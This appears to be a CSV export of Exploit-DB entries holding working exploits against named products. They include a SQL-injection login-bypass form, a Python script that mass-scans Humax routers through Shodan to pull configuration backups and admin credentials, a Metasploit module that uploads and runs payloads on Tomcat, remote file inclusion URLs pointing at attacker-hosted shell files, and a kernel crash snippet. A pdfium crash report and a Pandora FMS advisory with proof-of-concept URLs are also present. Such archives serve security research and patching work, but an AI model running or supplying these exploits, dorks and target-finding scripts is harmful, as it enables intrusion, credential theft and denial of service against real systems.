29533,"AdMentor - Admin Login SQL Injection source: https://www.securityfocus.com/bid/22281/info  AdMentor is prone to an SQL-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in an SQL query.  A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.   <html><title>AdMentor Script Remote SQL injection Exploit</title> =============================================================================================== <p><b><font size=""2"">[Script Name: <font color=""#0000FF"">AdMentor admin SQL injection </font></font></b></p> <p><b><font size=""2"">[Coded by : <font color=""#FF0000"">Cr@zy_King </font></font></b></p> <p><b><font size=""2"">[Author : <font color=""#FF0000"">Cr@zy_King </font></font></b></p> <p><b><font size=""2"">[Contact : <font color=""#FF0000"">Crazy_King@Eno7.org </font></font></b></p> <p><b><font size=""2"">[Dork : <font color=""#0000FF"">inurl:""admentor/admin"" </font></font></b></p> <p><b><font size=""2"">[Dork Ex. : <font color=""#0000FF"">http://www.google.com.tr/search?hl=tr&q=inurl%3A%22admentor%2Fadmin%22&btnG=Google%27da+Ara&meta= </font></font></b></p> <p><b><font size=""2"">[S.Page : <font color=""#0000FF"">http://www.aspcode.net/products/admentor </font></font></b></p> <p><b><font size=""2"">[Thanks : <font color=""#008000"">Erne & ApAci & Eno7 & Uyuss & Liz0zim & Thehacker & Xoron & Ajann</font></font></b> =============================================================================================== </p> <FORM NAME=giris ACTION=""http://victim.com/[path to script]/admin/login.asp"" METHOD=post> <table align=center> <td>Kullanici Adi:</td><td><INPUT NAME=kullanici class=""input"" value=""'or' '='"" SIZE=15></td> </tr><tr> <td>Sifre:</td><td><INPUT NAME=parola TYPE=text class=""input"" value=""'or' '='"" SIZE=15></td> </tr><tr> <td align=center colspan=2><BUTTON class=""input"" TYPE=submit>Giris</BUTTON></td> <b><font face=""Verdana"" size=""2"" color=""#008000"">Exploit Coded By Cr@zy_King</font></b></p> </tr></table></form></html>",AdMentor,1
42284,"Humax HG100R 2.0.6 - Backup File Download # coding: utf-8  # Exploit Title: Humax Backup file download # Date: 29/06/2017 # Exploit Author: gambler # Vendor Homepage: http://humaxdigital.com # Version: VER 2.0.6 # Tested on: OSX Linux # CVE : CVE-2017-7315  import sys import base64 import shodan import requests import subprocess  def banner():     print '''  ██░ ██  █    ██  ███▄ ▄███▓ ▄▄▄      ▒██   ██▒ ▓██░ ██▒ ██  ▓██▒▓██▒▀█▀ ██▒▒████▄    ▒▒ █ █ ▒░ ▒██▀▀██░▓██  ▒██░▓██    ▓██░▒██  ▀█▄  ░░  █   ░ ░▓█ ░██ ▓▓█  ░██░▒██    ▒██ ░██▄▄▄▄██  ░ █ █ ▒ ░▓█▒░██▓▒▒█████▓ ▒██▒   ░██▒ ▓█   ▓██▒▒██▒ ▒██▒  ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░   ░  ░ ▒▒   ▓▒█░▒▒ ░ ░▓ ░  ▒ ░▒░ ░░░▒░ ░ ░ ░  ░      ░  ▒   ▒▒ ░░░   ░▒ ░  ░  ░░ ░ ░░░ ░ ░ ░      ░     ░   ▒    ░    ░  ░  ░  ░   ░            ░         ░  ░ ░    ░     '''     print 'Description: Humax HG100R backup file download'     print 'Software Version: VER 2.0.6'     print 'SDK Version: 5.7.1mp1'     print 'IPv6 Stack Version: 1.2.2'     print 'Author: Gambler'     print 'Vulnerability founded: 14/03/2016'     print 'CVE: waiting'     print  def xplHelp():     print 'Exploit syntax error, Example:'     print 'python xpl.py http://192.168.0.1'  def exploit(server):     path = '/view/basic/GatewaySettings.bin'     if not server.startswith('http'):         server = 'http://%s' % server     if server.endswith('/'):         server = server[:-1]+''     url = '%s/%s' %(server,path)     print '[+] - Downloading configuration file and decoding'     try:         r = requests.get(url, stream=True,timeout=10)         for chunk in r.iter_content(chunk_size=1024):             if chunk:                 rawdata = r.content         save(rawdata)     except:         pass  def save(rawdata):     config = base64.b64decode(rawdata).decode('ascii','ignore').replace('^@','')     open('config.txt', 'w').write(config)     print '[+] - Done, file saved as config.txt'     infos = subprocess.Popen([""strings config.txt | grep -A 1 admin""], shell=True,stdout=subprocess.PIPE).communicate()[0]     print '[+] - Credentials found'     print infos  def shodanSearch():     SHODAN_API_KEY = ""SHODAN_API_KEY""     api = shodan.Shodan(SHODAN_API_KEY)     try:             results = api.search('Copyright © 2014 HUMAX Co., Ltd. All rights reserved.')             print 'Results found: %s' % results['total']             for result in results['matches']:                     router = 'http://%s:%s' % (result['ip_str'],result['port'])                     print router                     exploit(router)     except shodan.APIError, e:             print 'Error: %s' % e   if __name__ == '__main__':      if len(sys.argv) < 2:         xplHelp()         sys.exit()     banner()     if sys.argv[1] == 'shodan':         shodanSearch()     else:         exploit(sys.argv[1])",Humax HG100R,1
31433,"Apache Tomcat Manager - Application Upload (Authenticated) Code Execution (Metasploit) ## # This module requires Metasploit: http//metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   Rank = ExcellentRanking    HttpFingerprint = { :pattern => [ /Apache.*(Coyote|Tomcat)/ ] }    CSRF_VAR = 'CSRF_NONCE='    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::EXE    def initialize(info = {})     super(update_info(info,       'Name'        => 'Apache Tomcat Manager Application Upload Authenticated Code Execution',       'Description' => %q{         This module can be used to execute a payload on Apache Tomcat servers that         have an exposed ""manager"" application. The payload is uploaded as a WAR archive         containing a jsp application using a POST request against the /manager/html/upload         component.          NOTE: The compatible payload sets vary based on the selected target. For         example, you must select the Windows target to use native Windows payloads.       },       'Author'      => 'rangercha',       'License'     => MSF_LICENSE,       'References'  =>         [           # This is based on jduck's tomcat_mgr_deploy.           # the tomcat_mgr_deploy o longer works for current versions of tomcat due to           # CSRF protection tokens. Also PUT requests against the /manager/html/deploy           # aren't allowed anymore.            # There is no single vulnerability associated with deployment functionality.           # Instead, the focus has been on insecure/blank/hardcoded default passwords.            #  The following references refer to HP Operations Manager           ['CVE', '2009-3843'],           ['OSVDB', '60317'],           ['CVE', '2009-4189'],           ['OSVDB', '60670'],            # HP Operations Dashboard           ['CVE', '2009-4188'],            # IBM Cognos Express Default user/pass           ['BID', '38084'],           ['CVE', '2010-0557'],           ['URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21419179'],            # IBM Rational Quality Manager and Test Lab Manager           ['CVE', '2010-4094'],           ['ZDI', '10-214'],            # 'admin' password is blank in default Windows installer           ['CVE', '2009-3548'],           ['OSVDB', '60176'],           ['BID', '36954'],            # tomcat docs           ['URL', 'http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html']         ],       'Platform'    => %w{ java linux win }, # others?       'Targets'     =>         [           [ 'Java Universal',             {               'Arch'     => ARCH_JAVA,               'Platform' => 'java'             }           ],           #           # Platform specific targets only           #           [ 'Windows Universal',             {               'Arch'     => ARCH_X86,               'Platform' => 'win'             }           ],           [ 'Linux x86',             {               'Arch'     => ARCH_X86,               'Platform' => 'linux'             }           ]         ],       'DefaultTarget'  => 0,       'DisclosureDate' => 'Nov 09 2009'))      register_options(       [         OptString.new('USERNAME', [false, 'The username to authenticate as']),         OptString.new('PASSWORD', [false, 'The password for the specified username']),         # /cognos_express/manager/ for Cognos Express (19300)         OptString.new('TARGETURI', [true, ""The URI path of the manager app (/html/upload and /undeploy will be used)"", '/manager'])       ], self.class)   end    def check     res = query_manager     disconnect      return CheckCode::Unknown if res.nil?      if res.code.between?(400, 499)       vprint_error(""#{peer} - Server rejected the credentials"")       return CheckCode::Unknown     end      return CheckCode::Safe unless res.code == 200      # if res.code == 200     #   there should be access to the Tomcat Manager and to the status page     res = query_status     return CheckCode::Unknown unless res      plat = detect_platform(res.body)     arch = detect_arch(res.body)     return CheckCode::Unknown unless plat and arch      vprint_status(""#{peer} - Tomcat Manager found running on #{plat} platform and #{arch} architecture"")      report_auth_info(       :host   => rhost,       :port   => rport,       :sname  => (ssl ? ""https"" : ""http""),       :user   => datastore['USERNAME'],       :pass   => datastore['PASSWORD'],       :proof  => ""WEBAPP=\""Tomcat Manager App\"", VHOST=#{vhost}, PATH=#{datastore['PATH']}"",       :active => true     )      return CheckCode::Appears   end    def exploit     @app_base = rand_text_alphanumeric(4 + rand(32 - 4))     @jsp_name = rand_text_alphanumeric(4 + rand(32 - 4))      #     # Find the session ID and the CSRF token     #     print_status(""#{peer} - Retrieving session ID and CSRF token..."")     unless access_manager?       fail_with(Failure::Unknown, ""Unable to access the Tomcat Manager"")     end      #     # Upload Payload     #     print_status(""#{peer} - Uploading and deploying #{@app_base}..."")     if upload_payload       report_auth_info(         :host   => rhost,         :port   => rport,         :sname  => (ssl ? ""https"" : ""http""),         :user   => datastore['USERNAME'],         :pass   => datastore['PASSWORD'],         :proof  => ""WEBAPP=\""Tomcat Manager App\"", VHOST=#{vhost}, PATH=#{datastore['PATH']}"",         :active => true       )     else       fail_with(Failure::Unknown, ""Upload failed"")     end      #     # Execute Payload     #     print_status(""#{peer} - Executing #{@app_base}..."")     unless execute_payload       fail_with(Failure::Unknown, ""Failed to execute the payload"")     end      #     # Get the new CSRF token & session id     #     unless access_manager?       fail_with(Failure::Unknown, ""Unable to access the Tomcat Manager"")     end      #     # Delete the deployed payload     #     print_status(""#{peer} - Undeploying #{@app_base} ..."")     unless undeploy_app       print_warning(""#{peer} - Failed to undeploy #{@app_base}..."")     end   end    def query_status     path = normalize_uri(target_uri.path.to_s, 'status')     res = send_request_raw('uri' => path)      unless res and res.code == 200       vprint_error(""Failed: Error requesting #{path}"")       return nil     end      return res   end    def query_manager     path = normalize_uri(target_uri.path.to_s, '/html')     res = send_request_raw('uri' => path)      return res   end    def vars_get     vars = {}     unless @csrf_token.nil?       vars = {         ""path"" => @app_base,         ""org.apache.catalina.filters.CSRF_NONCE"" => @csrf_token       }     end      return vars   end    def detect_platform(body)     return nil if body.blank?      i=0      body.each_line do |ln|       ln.chomp!        i = 1 if ln =~ /OS Name/        if i == 9 or i == 11         if ln.include? ""Windows""           return 'win'         elsif ln.include? ""Linux""           return 'linux'         elsif i==11           return 'unknown'         end       end        i = i+1 if i > 0     end   end    def detect_arch(body)     return nil if body.blank?      i=0     body.each_line do |ln|       ln.chomp!        i = 1 if ln =~ /OS Architecture/        if i==9 or i==11         if ln.include? 'x86'           return ARCH_X86         elsif ln.include? 'i386'           return ARCH_X86         elsif ln.include? 'i686'           return ARCH_X86         elsif ln.include? 'x86_64'           return ARCH_X86         elsif ln.include? 'amd64'           return ARCH_X86         elsif i==11           return 'unknown'         end       end        i = i + 1 if i > 0     end   end    def find_csrf(res = nil)     return """" if res.blank?      vprint_status(""#{peer} - Finding CSRF token..."")      body = res.body      body.each_line do |ln|       ln.chomp!       csrf_nonce = ln.index(CSRF_VAR)       next if csrf_nonce.nil?       token = ln[csrf_nonce + CSRF_VAR.length, 32]       return token     end      return """"   end    def generate_multipart_msg(boundary, data)     # Rex::MIME::Message is breaking the binary upload when trying to     # enforce CRLF for SMTP compatibility     war_multipart = ""-----------------------------""     war_multipart << boundary     war_multipart << ""\r\nContent-Disposition: form-data; name=\""deployWar\""; filename=\""""     war_multipart << @app_base     war_multipart << "".war\""\r\nContent-Type: application/octet-stream\r\n\r\n""     war_multipart << data     war_multipart << ""\r\n-----------------------------""     war_multipart << boundary     war_multipart << ""--\r\n""   end    def war_payload     payload.encoded_war({       :app_name => @app_base,       :jsp_name => @jsp_name,       :arch => target.arch,       :platform => target.platform     }).to_s   end    def send_war_payload(url, war)     boundary_identifier = rand_text_numeric(28)      res = send_request_cgi({       'uri'          => url,       'method'       => 'POST',       'ctype'        => 'multipart/form-data; boundary=---------------------------' + boundary_identifier,       'user'         => datastore['USERNAME'],       'password'     => datastore['PASSWORD'],       'cookie'       => @session_id,       'vars_get'     => vars_get,       'data'         => generate_multipart_msg(boundary_identifier, war),     })      return res   end    def send_request_undeploy(url)     res = send_request_cgi({       'uri'          => url,       'vars_get'     => vars_get,       'method'       => 'POST',       'user'         => datastore['USERNAME'],       'password'     => datastore['PASSWORD'],       'cookie'       => @session_id     })      return res   end    def access_manager?     res = query_manager     return false unless res and res.code == 200     @session_id = res.get_cookies     @csrf_token = find_csrf(res)     return true   end    def upload_payload     war = war_payload     upload_path = normalize_uri(target_uri.path.to_s, ""html"", ""upload"")     vprint_status(""#{peer} - Uploading #{war.length} bytes as #{@app_base}.war ..."")     res = send_war_payload(upload_path, war)     return parse_upload_response(res)   end    def parse_upload_response(res)     unless res       vprint_error(""#{peer} - Upload failed on #{upload_path} [No Response]"")       return false     end      if res.code < 200 or res.code >= 300       vprint_warning(""Warning: The web site asked for authentication: #{res.headers['WWW-Authenticate'] || res.headers['Authentication']}"") if res.code == 401       vprint_error(""Upload failed on #{upload_path} [#{res.code} #{res.message}]"")       return false     end      return true   end    def execute_payload     jsp_path = normalize_uri(@app_base, ""#{@jsp_name}.jsp"")      vprint_status(""#{peer} - Executing #{jsp_path}..."")      res = send_request_cgi({       'uri'          => jsp_path,       'method'       => 'GET'     })      return parse_execute_response(res)   end    def parse_execute_response(res)     unless res       vprint_error(""#{peer} - Execution failed on #{@app_base} [No Response]"")       return false     end      if res and (res.code < 200 or res.code >= 300)       vprint_error(""#{peer} - Execution failed on #{@app_base} [#{res.code} #{res.message}]"")       return false     end      return true   end    def undeploy_app     undeploy_url = normalize_uri(target_uri.path.to_s, ""html"", ""undeploy"")     res = send_request_undeploy(undeploy_url)      unless res       vprint_warning(""#{peer} - WARNING: Undeployment failed on #{undeploy_url} [No Response]"")       return false     end      if res and (res.code < 200 or res.code >= 300)       vprint_warning(""#{peer} - Deletion failed on #{undeploy_url} [#{res.code} #{res.message}]"")       return false     end      return true   end  end",Apache Tomcat Manager,1
31450,W-Agora 4.0 - 'create_forum.php?bn_dir_default' Remote File Inclusion source: https://www.securityfocus.com/bid/28366/info   w-Agora is prone to multiple remote file-include vulnerabilities because it fails to sufficiently sanitize user-supplied data.   Exploiting these issues may allow an attacker to compromise the application and the underlying system; other attacks are also possible.   w-Agora 4.0 is vulnerable; other versions may also be affected.  http://www.example.com/w-agora_path/create_forum.php?bn_dir_default=ZoRLu.txt?,W-Agora,1
19830,"Microsoft Index Server 2.0 - '%20' ASP Source Disclosure source: https://www.securityfocus.com/bid/1084/info  Index Server can be used to cause IIS to display the source of .asp and possibly other server-side processed files.  By appending a space (%20) to the end of the filename specified in the 'CiWebHitsFile' variable, and setting 'CiHiliteType' to 'Full' and 'CiRestriction' to 'None', it is possible to retrieve the unprocessed source of the file.  This is possible on any machine with Index Server installed, even those with no normal .htw files, because the virtual file null.htw is stored in memory and the .htw extension is mapped by default to webhits.dll .   Requesting a URL like the following will return the source of default.asp on a vulnerable system:  http://target/null.htw?CiWebHitsFile=/default.asp%20&CiRestriction=none&CiHiliteType=Full",Microsoft Index Server,1
15998,"Kingsoft AntiVirus 2011 SP5.2 'KisKrnl.sys' 2011.1.13.89 - Local Kernel Mode Denial of Service # Kingsoft AntiVirus 2011 SP5.2 KisKrnl.sys <= 2011.1.13.89 Local Kernel Mode D.O.S Exploit # Date: 2011-1-16 # Author: MJ0011 # Software Link: http://cd001.www.duba.net/duba/install/2011/once/KAV110114_DOWN_9_13.exe # Version: KingSoft AntiVirus 2011 SP5.2 with KisKrnl.sys <=2011.1.13.89 # Tested on: Windows XP SP3  DETAILS: KisKrnl.sys hook the kernel function KiFastCallEntry , but is not correctly handle user stack pointer  EXPLOIT CODE:  __asm { mov edx , 0x80000000 mov eax , 0x101        ;id of NtTerminateProcess under Windows XP  int 0x2e }",Kingsoft AntiVirus,1
3315,"nabopoll 1.2 - 'survey.inc.php?path' Remote File Inclusion By Cr@zy_King  crazy_king@eno7.org  Thakns : ApAci & Erne & Uyussman & Eno7 & Thehacker & Crackers_Child & Liz0zim  Script : nabopoll 1.x  Risk : Remote File .nclude | High  Site : http://nabocorp.com/  Google Dork : inurl:""nabopoll/""  Exploit : include_once($path.""includes/tags.inc.php""); include_once($path.""config.inc.php"");  Files: survey.inc.php  Exploit : http://www.site.com/[path]/survey.inc.php?path=http://sheel.txt?  Ayyildiz.Org Present  # milw0rm.com [2007-02-15]",nabopoll,1
39163,"pdfium - CPDF_TextObject::CalcPositionData Heap Out-of-Bounds Read Source: https://code.google.com/p/google-security-research/issues/detail?id=623  The following crash was encountered in pdfium (the Chrome PDF renderer) during PDF fuzzing:  --- cut --- $ ./pdfium_test asan_heap-oob_b4a7e0_7134_a91748c99d169425fc39c76197d7cd74  Rendering PDF file asan_heap-oob_b4a7e0_7134_a91748c99d169425fc39c76197d7cd74. Non-linearized path... ================================================================= ==27153==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60700000794c at pc 0x000000cfaaef bp 0x7ffd89a11070 sp 0x7ffd89a11068 READ of size 4 at 0x60700000794c thread T0     #0 0xcfaaee in CPDF_TextObject::CalcPositionData(float*, float*, float, int) core/src/fpdfapi/fpdf_page/fpdf_page.cpp:411:17     #1 0xda18a4 in CPDF_StreamContentParser::AddTextObject(CFX_ByteString*, float, float*, int) core/src/fpdfapi/fpdf_page/fpdf_page_parser.cpp:1301:3     #2 0xd919e7 in CPDF_StreamContentParser::Handle_ShowText() core/src/fpdfapi/fpdf_page/fpdf_page_parser.cpp:1330:3     #3 0xd979e1 in CPDF_StreamContentParser::OnOperator(char const*) core/src/fpdfapi/fpdf_page/fpdf_page_parser.cpp:369:7     #4 0xda3491 in CPDF_StreamContentParser::Parse(unsigned char const*, unsigned int, unsigned int) core/src/fpdfapi/fpdf_page/fpdf_page_parser_old.cpp:56:9     #5 0xdb7d0f in CPDF_ContentParser::Continue(IFX_Pause*) core/src/fpdfapi/fpdf_page/fpdf_page_parser_old.cpp:1096:13     #6 0xd01db4 in CPDF_PageObjects::ContinueParse(IFX_Pause*) core/src/fpdfapi/fpdf_page/fpdf_page.cpp:693:3     #7 0xd0568d in CPDF_Page::ParseContent(CPDF_ParseOptions*, int) core/src/fpdfapi/fpdf_page/fpdf_page.cpp:874:3     #8 0x63bbe7 in FPDF_LoadPage fpdfsdk/src/fpdfview.cpp:291:3     #9 0x4edcd1 in RenderPage(std::string const&, void* const&, void* const&, int, Options const&) samples/pdfium_test.cc:352:20     #10 0x4f0af8 in RenderPdf(std::string const&, char const*, unsigned long, Options const&) samples/pdfium_test.cc:531:9     #11 0x4f16e9 in main samples/pdfium_test.cc:608:5  0x60700000794c is located 4 bytes to the left of 72-byte region [0x607000007950,0x607000007998) allocated by thread T0 here:     #0 0x4be96c in calloc llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:56     #1 0x67da0f in FX_AllocOrDie(unsigned long, unsigned long) fpdfsdk/src/../include/../../core/include/fpdfapi/../fxcrt/fx_memory.h:37:22     #2 0xcf6db6 in CPDF_TextObject::SetSegments(CFX_ByteString const*, float*, int) core/src/fpdfapi/fpdf_page/fpdf_page.cpp:233:18     #3 0xda150f in CPDF_StreamContentParser::AddTextObject(CFX_ByteString*, float, float*, int) core/src/fpdfapi/fpdf_page/fpdf_page_parser.cpp:1296:3     #4 0xd919e7 in CPDF_StreamContentParser::Handle_ShowText() core/src/fpdfapi/fpdf_page/fpdf_page_parser.cpp:1330:3     #5 0xd979e1 in CPDF_StreamContentParser::OnOperator(char const*) core/src/fpdfapi/fpdf_page/fpdf_page_parser.cpp:369:7     #6 0xda3491 in CPDF_StreamContentParser::Parse(unsigned char const*, unsigned int, unsigned int) core/src/fpdfapi/fpdf_page/fpdf_page_parser_old.cpp:56:9     #7 0xdb7d0f in CPDF_ContentParser::Continue(IFX_Pause*) core/src/fpdfapi/fpdf_page/fpdf_page_parser_old.cpp:1096:13     #8 0xd01db4 in CPDF_PageObjects::ContinueParse(IFX_Pause*) core/src/fpdfapi/fpdf_page/fpdf_page.cpp:693:3     #9 0xd0568d in CPDF_Page::ParseContent(CPDF_ParseOptions*, int) core/src/fpdfapi/fpdf_page/fpdf_page.cpp:874:3     #10 0x63bbe7 in FPDF_LoadPage fpdfsdk/src/fpdfview.cpp:291:3     #11 0x4edcd1 in RenderPage(std::string const&, void* const&, void* const&, int, Options const&) samples/pdfium_test.cc:352:20     #12 0x4f0af8 in RenderPdf(std::string const&, char const*, unsigned long, Options const&) samples/pdfium_test.cc:531:9     #13 0x4f16e9 in main samples/pdfium_test.cc:608:5  SUMMARY: AddressSanitizer: heap-buffer-overflow core/src/fpdfapi/fpdf_page/fpdf_page.cpp:411:17 in CPDF_TextObject::CalcPositionData(float*, float*, float, int) Shadow bytes around the buggy address:   0x0c0e7fff8ed0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c0e7fff8ee0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c0e7fff8ef0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c0e7fff8f00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa   0x0c0e7fff8f10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c0e7fff8f20: fa fa fa fa fa fa fa fa fa[fa]00 00 00 00 00 00   0x0c0e7fff8f30: 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 00   0x0c0e7fff8f40: 00 04 fa fa fa fa 00 00 00 00 00 00 00 00 00 fa   0x0c0e7fff8f50: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 fa fa   0x0c0e7fff8f60: fa fa 00 00 00 00 00 00 00 00 00 00 fa fa fa fa   0x0c0e7fff8f70: 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fd fd Shadow byte legend (one shadow byte represents 8 application bytes):   Addressable:           00   Partially addressable: 01 02 03 04 05 06 07    Heap left redzone:       fa   Heap right redzone:      fb   Freed heap region:       fd   Stack left redzone:      f1   Stack mid redzone:       f2   Stack right redzone:     f3   Stack partial redzone:   f4   Stack after return:      f5   Stack use after scope:   f8   Global redzone:          f9   Global init order:       f6   Poisoned by user:        f7   Container overflow:      fc   Array cookie:            ac   Intra object redzone:    bb   ASan internal:           fe   Left alloca redzone:     ca   Right alloca redzone:    cb ==27153==ABORTING --- cut ---  The crash was reported at https://code.google.com/p/chromium/issues/detail?id=554115. Attached is the PDF file which triggers the crash.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39163.zip",pdfium,1
15643,"Pandora Fms 3.1 - Directory Traversal / Local File Inclusion [+] Introduction  Pandora FMS (for Pandora Flexible Monitoring System) is a software solution for monitoring computer networks. It allows monitoring in a visual way the status and performance of several parameters from different operating systems, servers, applications and hardware systems such as firewalls, proxies, databases, web servers or routers.  It can be deployed in almost any operating system. It features remote monitoring (WMI, SNMP, TCP. UDP, ICMP, HTTP...) and it can also use agents. An agent is available for each platform. It can also monitor hardware systems with a TCP/IP stack, such as load balancers, routers, network switches, printers or firewalls.  This software has several servers that process and get information from different sources, using WMI for gathering remote Windows information, a predictive server, a plug-in server which makes complex user-defined network tests, an advanced export server to replicate data between different sites of Pandora FMS, a network discovery server, and an SNMP Trap console.  Released under the terms of the GNU General Public License, Pandora FMS is free software.  5) Path Traversal:  5.1 - PHP File Inclusion (or RFI/LFI: Remote/Local file inclusion) - CVE-2010-4281 -CVE-2010-4282 - CVSS 8.5/10  Parameter 'page' of ajax.php is not properly sanitizing user-supplied input. The function safe_url_extraclean is filtering ':' character, and it doesn't allow to use the string ""http://""; to create urls, but allows '/' character and an attacker could reference remote resources via Windows UNC files, using //servername//resource/file  Note that the first check in safe_url_extraclean is filtering '://', so we can bypass the filter easily doing http://http://url, and it only strip the first protocol://. However, the last preg_replace strips the : character.  Proof of concept:  UNC: http://servername/pandora_console/ajax.php?page=//server/share/test  As well, ajax.php allows to include any php file in the disk  filesystem: http://servername/pandora_console/ajax.php?page=../../../../../directory/file  Character %00 is not allowed due safe_url_extraclean function filtering, and is not possible to include other files distinct that php files, but still allows . and / characters.   5.2 - PHP File Inclusion (or RFI Remote file inclusion) - CVE-2010-4283 - - CVSS 7.9/10  An attacker can inject arbitrary PHP code and execute it remotely due argv[1] parameter is not filtered in file pandora_diag.php.  PoC: http://servername/pandora_console/extras/pandora_diag.php?argc=2&argv[1]=http://serverattacker/salsa.php%00  Note: that issue needs register_globals set to On to be exploitable.   5.3 - Path traversal & Local file inclusion vulnerabilities - CVE-2010-4282 - CVSS 6.8/10  An attacker can include arbitrary files of the filesystem via id parameter in file pandora_help.php.   Snippet of vulnerable code:   24 $id = get_parameter ('id');  25  26 /* Possible file locations */  27 $files = array ($config[""homedir""].""/include/help/"".$config[""language""].""/help_"".$id."".php"",  28 $config[""homedir""].ENTERPRISE_DIR.""/include/help/"".$config[""language""].""/help_"".$id."".php"",  29 $config[""homedir""].ENTERPRISE_DIR.""/include/help/en/help_"".$id."".php"",  30         $config[""homedir""].""/include/help/en/help_"".$id."".php"");  31 $help_file = '';  32 foreach ($files as $file) {  33         if (file_exists ($file)) {  34                 $help_file = $file;  35                 break;  36         }  37 } ...  62 require_once ($help_file);   Proof of concept:  http://servername/pandora_console/general/pandora_help.php?id=/../../../../../../../boot.ini%00  This code is platform dependent bug, you can read more at http://seclists.org/fulldisclosure/2010/Jul/137 Only works in windows systems, an attacker can include local file using ../ characters due parameter id is not filtered If magic_quotes_gpc is Off, arbitrary files can be included, like boot.ini using NULL character (%00), if not, only php files are allowed   5.4 - Path traversal & Arbitrary write and delete files - CVE-2010-4282 - - CVSS 8.0/10  In file operation/agentes/networkmap.php the 'layout' parameter is handled in an insecure way and it is used to write and delete files on the filesystem. An attacker could use this parameter to write in arbitrary paths and even remove files.  Snippet of vulnerable code:  32 $layout = (string) get_parameter ('layout', 'radial'); ... 137 $filename_map = $config[""attachment_store""].""/networkmap_"".$layout; 138 $filename_img = ""attachment/networkmap_"".$layout.""_"".$font_size; 139 $filename_dot = $config[""attachment_store""].""/networkmap_"".$layout; ... 157         $fh = @fopen ($filename_dot, 'w'); 158         if ($fh === false) { 159                 $result = false; 160         } else { 161                 fwrite ($fh, $graph); 162                 $cmd = ""$filter -Tcmapx -o"".$filename_map."" -Tpng - -o"".$filename_img."" "".$filename_dot; 163                 $result = system ($cmd); 164                 fclose ($fh); 165                 unlink ($filename_dot); 166         } ... 178         require ($filename_map);   Character sequences '../' could be used to write files (due -o parameter in lines 162 and 163), as well as potentially remove files (line 157, 161 and 165) or include them (line 178) As well like in 5.3 this issue is only exploitable in windows environments because the same reason.   [+] Impact  An attacker can execute commands of the operating system, inject remote code in the context of the application, get arbitrary files from the filesystem or extract any data of the database including passwords and confidential information about the monitored network/systems. Also it is possible to bypass the authentication or scale privileges to became admin, gaining full control of the web application and web server. These vulnerabilities have a high impact to the confidentiality, integrity, and availability of the system.   [+] Systems affected  Versions prior and including 3.1 of Pandora FMS are affected   [+] Solution  Apply the security fix for version 3.1: http://sourceforge.net/projects/pandora/files/Pandora%20FMS%203.1/Final%20version%20%28Stable%29/pandorafms_console-3.1_security_patch_13Oct2010.tar.gz/download   Or upgrade to version 3.1.1 from http://sourceforge.net/projects/pandora/files/Pandora%20FMS%203.1/3.1.1/   [+] Timeline  Ago 2010: First contact to vendor Ago 2010: Confirmation of vendor Sept 2010: Second contact: SQL Injection vulnerabilities Sept 2010: Confirmation that the fix will be released on October Oct 2010: PandoraFMS security patch for 3.1 version released Oct 2010: Request for CVE numbers Nov 2010: PandoraFMS version 3.1.1 released Nov 2010: Disclosure of this advisory   [+] References  Official PandoraFMS site: http://pandorafms.org/ SourceForge PandoraFMS site: http://sourceforge.net/projects/pandora/ Wikipedia entry about PandoraFMS: http://en.wikipedia.org/wiki/Pandora_FMS Common Vulnerability Scoring System (CVSS) v2 calculator: http://nvd.nist.gov/cvss.cfm?calculator&adv&version=2 Common Vulnerabilities and Exposures (CVE): http://cve.mitre.org/   [+] Credits  These vulnerabilities has been discovered by Juan Galiana Lara - @jgaliana - http://juangaliana.blogspot.com/  -----BEGIN PGP SIGNATURE----- Version: GnuPG v1.4.10 (GNU/Linux)  iQIcBAEBAgAGBQJM9NctAAoJEJaV5RMdiDI7cTMP/jzyDB8hcuTGYy+hHnehx0Fy YbVmWTMCUhIHZ6Y6ke1xLbFf0itFm/tMSvqC/20cAKC0x+QEmEVoSJPerT+Fc/3s IVjIEMxBbaKNM6inAElng5BzC0MTOjI+njtpF7pmLaIFBy8C77+u/LNrSM7tucy9 WIx6ILVGSO0LY5vfgwdRAcJow6p/wn50U4Ur2XOVZ/X10Gbsb+9qMd4+q1d87Cw4 cC+mqTefLeP8FNh6PB2tJpdpQqJ3R2G8719fHgmDm/5SVBkoXZRhjHKokR9+wtzP JPJWP3z1Zt+Wtn3+ANakDItBenbgafM2lMe0tkiy9LoQKMKepibLqOf9xfrKqTnP 8CRffcV8nLorGBoKk7UKVb3I14llt34cu+Vcx2+WgDz37hXV1iK7pufGuFxVVRE4 7etidHR9n7gO1WPbLmrKq4rrR02zhYnAHsGwjtFQId3ufRGSBTno3yNHFj1j0EvH pARhwbRtjIiSk8JF3TjeTswGMpCIItpQ051K4Bcpbtzte7fX05CLoaF6xyJBJlS5 yNuxaBnGZYVOvUd+emosH+5ngW7Qk8/wXljx2OyVOu6ip75UZ277MRLBJvlq+NC4 oBllQOzv521fd5hkgYEQ8VZQgWCzbeRTuh+t4z+MUHKTQlcE2I0ba9C6xdn0nkZF sn9vRJk4gc/PozOXDjC3 =WmOh -----END PGP SIGNATURE-----",Pandora Fms,1
